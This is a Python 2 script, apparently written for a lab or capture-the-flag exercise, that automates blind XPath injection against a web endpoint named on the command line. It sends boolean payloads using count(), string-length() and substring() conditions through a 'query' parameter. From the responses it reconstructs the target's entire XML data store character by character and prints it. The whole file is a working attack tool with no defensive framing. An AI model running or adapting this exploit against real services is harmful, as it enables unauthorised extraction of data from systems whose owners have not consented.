#!/usr/bin/env python
import argparse
import string
import urllib
import urllib2
from xml.dom.minidom import *

class XCrawler(object):
    strTrue = " and '1'='1"
    strFalse = " and '1'='0"
    strCount = "' and count({})={}"
    strLength = "' and string-length({})={}"
    strSub = "' and substring({},1,{}) = '{}'"
    strConfirm = "' exists"
    charList = string.printable

    def __init__(self):
        args = self.setArgs()
        self.url = args.url
        self.xml = Document()

    def count_node(self, path):
        count = 0
        for i in range(1, 100):
            payload = self.makePayload(self.strCount.format(path, i))
            if self.getRequest(payload):
                count = i
                break
        return count

    def find_length(self, path):
        length = 0
        for i in range(1, 100):
            payload = self.makePayload(self.strLength.format(path, i))
            if self.getRequest(payload):
                length = i
                break
        return length

    def find_name(self, path, length):
        name = ""
        for i in range(1, length + 1):
            for char in self.charList:
                payload = self.makePayload(self.strSub.format(path, i, name + char))
                if self.getRequest(payload):
                    name += char
                    break
        return name

    def getRequest(self, payload):
        response = urllib2.urlopen(self.url + "?" + payload)
        html = response.read()
        return self.strConfirm in html

    def makePayload(self, step):
        return urllib.urlencode({"query": "hentouane" + step + self.strTrue})

    def setArgs(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-url')
        return parser.parse_args()

    def crawlXml(self, base_path, parent_node = None):
        nodeIndex = 1
        path = base_path
        nodeCount = self.count_node(path)
        while nodeIndex <= nodeCount:
            path = base_path + "[{}]".format(nodeIndex)
            length = self.find_length("name(" + path + ")")
            name = self.find_name("name(" + path + ")", length)

            node = self.xml.createElement(name)

            text_length = self.find_length(path + "/text()")
            if text_length > 0:
                text = self.find_name(path + "/text()", text_length)
                text_node = self.xml.createTextNode(text)
                node.appendChild(text_node)

            if parent_node is None:
                self.xml.appendChild(node)
            else:
                parent_node.appendChild(node)
            if self.count_node(path + "/*") > 0:
                self.crawlXml(path + "/*", node)
            nodeIndex += 1

    def main(self):
        self.crawlXml('/*')
        print self.xml.toprettyxml()

if __name__ == '__main__':
    xcrawler = XCrawler()
    xcrawler.main()